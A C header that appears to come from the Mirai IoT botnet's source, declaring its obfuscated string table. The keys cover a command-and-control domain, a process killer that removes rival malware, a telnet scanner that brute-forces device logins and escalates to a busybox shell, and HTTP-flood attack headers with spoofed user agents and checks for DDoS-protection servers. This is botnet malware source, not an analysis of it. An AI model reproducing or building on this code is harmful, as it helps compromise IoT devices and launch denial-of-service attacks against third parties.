#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_EXEC_SUCCESS          1

#define TABLE_CNC_DOMAIN            2

#define TABLE_WATCHDOG1             3
#define TABLE_WATCHDOG2             4
#define TABLE_WATCHDOG3             5

#define TABLE_KILLER_TCP            6
#define TABLE_KILLER_PROC           7
#define TABLE_KILLER_EXE            8
#define TABLE_KILLER_FD             9
#define TABLE_KILLER_CMDLINE        10

#define TABLE_ATK_VSE               11
#define TABLE_ATK_RESOLVER          12
#define TABLE_ATK_NSERV             13

#define TABLE_SCAN_OPEN_OK          14
#define TABLE_SCAN_VERIFY_OK        15
#define TABLE_SCAN_RAND_NUM         16
#define TABLE_SCAN_SEG_FAULT        17
#define TABLE_SCAN_ILLEGAL          18
#define TABLE_SCAN_DLR_OUTPUT       19
#define TABLE_SCAN_ECHO_RESP        20
#define TABLE_SCAN_ASSWORD          21
#define TABLE_SCAN_OGIN             22
#define TABLE_SCAN_ENTER            23
#define TABLE_SCAN_BUSYBOX_RESP     24
#define TABLE_SCAN_NCORRECT         25
#define TABLE_SCAN_TNET_OPEN_ONCE   26
#define TABLE_SCAN_REPORT           27
#define TABLE_KILLER_SOFIA          28

#define TABLE_SCAN_CB_PORT          29  /* Port to connect to */
#define TABLE_SCAN_SHELL            30  /* 'shell' to enable shell access */
#define TABLE_SCAN_ENABLE           31  /* 'enable' to enable shell access */
#define TABLE_SCAN_SYSTEM           32  /* 'system' to enable shell access */
#define TABLE_SCAN_SH               33  /* 'sh' to enable shell access */
#define TABLE_SCAN_QUERY            34  /* echo hex string to verify login */
#define TABLE_SCAN_RESP             35  /* utf8 version of query string */
#define TABLE_SCAN_PS               36  /* "/bin/busybox ps" */
#define TABLE_SCAN_KILL_9           37  /* "/bin/busybox kill -9 " */

#define TABLE_ATK_KEEP_ALIVE            38  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                39  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            40  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          41  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_SET_COOKIE            42  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           43  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          44  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        45  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    46  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 47  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               48  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        49  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        50  // "connection:"
#define TABLE_ATK_DOSARREST             51  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      52  // "server: cloudflare-nginx"

/* User agent strings */
#define TABLE_HTTP_ONE                  53  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_TWO                  54  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_THREE                55  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_FOUR                 56  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_FIVE                 57  /* "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" */

#define TABLE_MAX_KEYS                  58 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
